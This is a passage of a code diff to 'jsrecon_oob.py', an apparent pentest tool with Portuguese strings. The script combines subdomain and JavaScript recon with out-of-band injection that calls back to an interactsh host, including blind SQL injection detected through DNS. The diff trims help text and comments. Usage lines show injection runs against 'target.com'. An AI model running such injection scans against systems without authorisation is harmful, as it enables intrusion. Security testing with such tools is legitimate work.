     clog(lg, f"\n  Sumário: {summary_file}", C.GREEN)
@@ -1845,22 +1759,11 @@ def parse_args() -> argparse.Namespace:
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Exemplos:
-  # Completo
   python3 jsrecon_oob.py target.com -o abc123.oast.fun
-
-  # Sem browser (mais rápido)
   python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-live
-
-  # Já tem recon — só roda injeção
   python3 jsrecon_oob.py target.com -o abc123.oast.fun --skip-recon
-
-  # Só recon, sem OOB
   python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-oob
-
-  # Monitor longo (blind SQLi via DNS pode demorar)
   python3 jsrecon_oob.py target.com -o abc123.oast.fun --monitor-time 1800
-
-  # Com proxy (Burp Suite)
   python3 jsrecon_oob.py target.com -o abc123.oast.fun --proxy http://127.0.0.1:8080
 
 Variáveis de ambiente:
@@ -1871,41 +1774,30 @@ Variáveis de ambiente:
     p.add_argument("domain",            help="Domínio alvo (ex: target.com.br)")
     p.add_argument("-o", "--oob",       required=False, default="",
                    help="Host interactsh (ex: abc123.oast.fun)")
-    p.add_argument("--skip-recon",      action="store_true",
-                   help="Pula recon (usa endpoints.jsonl existente)")
-    p.add_argument("--no-nmap",         action="store_true", help="Pula nmap")
-    p.add_argument("--single-target",   action="store_true",
-                   help="Só o domínio passado — sem enum de subdomínios")
-    p.add_argument("--no-subs",         action="store_true",
-                   help="Pula enumeração de subdomínios")
-    p.add_argument("--no-live",         action="store_true", help="Pula Playwright")
-    p.add_argument("--no-oob",          action="store_true", help="Pula injeção OOB")
-    p.add_argument("--no-cache",        action="store_true", help="Ignora cache de JS")
-    p.add_argument("--no-headless",     action="store_true", help="Browser visível (debug)")
-    p.add_argument("--poll",            action="store_true", help="Só monitora OOB")
-    p.add_argument("--monitor-time",    type=int,   default=300,  metavar="S",
-                   help="Duração do monitor em segundos (default: 300)")
-    p.add_argument("--delay",           type=float, default=0.5,  metavar="S",
-                   help="Delay mínimo global entre requisições (default: 0.5)")
-    p.add_argument("--threads",         type=int,   default=5,    metavar="N",
-                   help="Threads de injeção (default: 5)")
-    p.add_argument("--workers",         type=int,   default=20,   metavar="N",
-                   help="Workers de análise JS (default: 20)")
-    p.add_argument("--timeout",         type=int,   default=10,   metavar="S",
-                   help="Timeout HTTP (default: 10)")
-    p.add_argument("--proxy",           default="",  metavar="URL",
-                   help="Proxy HTTP (ex: http://127.0.0.1:8080)")
-    p.add_argument("--output-dir",      default="",  metavar="DIR",
-                   help="Diretório de saída (default: jsrecon_oob_<domain>)")
+    p.add_argument("--skip-recon",      action="store_true")
+    p.add_argument("--no-nmap",         action="store_true")
+    p.add_argument("--single-target",   action="store_true")
+    p.add_argument("--no-subs",         action="store_true")
+    p.add_argument("--no-live",         action="store_true")
+    p.add_argument("--no-oob",          action="store_true")
+    p.add_argument("--no-cache",        action="store_true")
+    p.add_argument("--no-headless",     action="store_true")
+    p.add_argument("--poll",            action="store_true")
+    p.add_argument("--monitor-time",    type=int,   default=300,  metavar="S")
+    p.add_argument("--delay",           type=float, default=0.5,  metavar="S")
+    p.add_argument("--threads",         type=int,   default=5,    metavar="N")
+    p.add_argument("--workers",         type=int,   default=20,   metavar="N")
+    p.add_argument("--timeout",         type=int,   default=10,   metavar="S")
+    p.add_argument("--proxy",           default="",  metavar="URL")
+    p.add_argument("--output-dir",      default="",  metavar="DIR")
     return p.parse_args()
 
-# ─── Main ──────────────────────────────────────────────────────────────────────
+# ─── Main ─────────────────────────────────────────────────────────────────────
 def main() -> None:
     args = parse_args()
 
-    raw_input = args.domain.strip().rstrip("/")
-
-    parsed_input  = urlparse(raw_input if "://" in raw_input else f"placeholder://{raw_input}")
+    raw_input    = args.domain.strip().rstrip("/")
+    parsed_input = urlparse(raw_input if "://" in raw_input else f"placeholder://{raw_input}")
     forced_scheme = parsed_input.scheme if parsed_input.scheme not in ("", "placeholder") else ""
     domain        = parsed_input.hostname or raw_input.split(":")[0]
     forced_port   = parsed_input.port or 0
@@ -1929,7 +1821,6 @@ def main() -> None:
     out = Path(args.output_dir or f"jsrecon_oob_{domain.replace('.','_')}")
     out.mkdir(parents=True, exist_ok=True)
 
-    # FIX: inicializa rate limiter global com o delay do usuário
     global _rate_limiter
     _rate_limiter = GlobalRateLimiter(args.delay)
 
@@ -1946,10 +1837,7 @@ def main() -> None:
 
     clog(lg, f"\n{'═'*66}", C.CYAN + C.BOLD)
     clog(lg, f"  jsrecon_oob  —  alvo: {target_label}", C.CYAN + C.BOLD)
-    if forced_scheme:
-        clog(lg, f"  Scheme      : {forced_scheme} (forçado)", C.CYAN)
-    if forced_port:
-        clog(lg, f"  Porta       : {forced_port} (forçada)", C.CYAN)
+    clog(lg, f"  User-Agent  : {REAL_UA[:55]}...", C.CYAN)
     if args.oob:
         clog(lg, f"  OOB host    : {args.oob}", C.CYAN)
     clog(lg, f"  Rate limit  : 1 req / {args.delay}s (global)", C.CYAN)
@@ -1965,7 +1853,6 @@ def main() -> None:
             print("--poll requer -o <oob_host>")
             sys.exit(1)
         plog.load_existing()
-        clog(lg, f"  Payloads carregados: {len(plog.entries)}", C.DIM)
         phase_monitor(args.oob, plog, out, args.monitor_time, lg)
         return
 
@@ -1974,7 +1861,7 @@ def main() -> None:
     if args.skip_recon:
         ep_jsonl = out / "endpoints.jsonl"
         if not ep_jsonl.exists():
-            clog(lg, "endpoints.jsonl não encontrado. Rode sem --skip-recon.", C.RED, "error")
+            clog(lg, "endpoints.jsonl não encontrado.", C.RED, "error")
             sys.exit(1)
         for line in ep_jsonl.read_text().splitlines():
             try:
@@ -1987,9 +1874,9 @@ def main() -> None:
         single = getattr(args, "single_target", False)
 
         if single:
-            clog(lg, f"\n  Modo single-target: apenas {domain}", C.YELLOW + C.BOLD)
-
-        if single or args.no_subs:
+            subs = {domain}
+            _write(out / "subdomains.txt", [domain], lg)
+        elif args.no_subs:
             subs = {domain}
             _write(out / "subdomains.txt", [domain], lg)
         else:
@@ -2029,8 +1916,6 @@ def main() -> None:
                 key = parsed.netloc
                 if key not in seen_hosts:
                     seen_hosts.add(key)
-                    # FIX: usa URL completa com path (ex: https://host:5001/api/v1/)
-                    # Antes descartava o path — páginas sem ele podem retornar 404.
                     targets.append(url)
             js_from_browser = asyncio.run(
                 playwright_all(targets, not args.no_headless, lg)
@@ -2068,12 +1953,9 @@ def main() -> None:
         monitor_thread = phase_monitor(
             args.oob, plog, out, args.monitor_time, lg, parallel=True
         )
-        clog(lg, "  Monitor OOB iniciado em background.", C.DIM)
-
         phase_inject(endpoints, args.oob, out, plog,
                      delay=args.delay, threads=args.threads, lg=lg,
                      proxy=args.proxy)
-
         if monitor_thread and monitor_thread.is_alive():
             clog(lg,
                  f"\n  Injeção concluída. Aguardando monitor ({args.monitor_time}s)...",
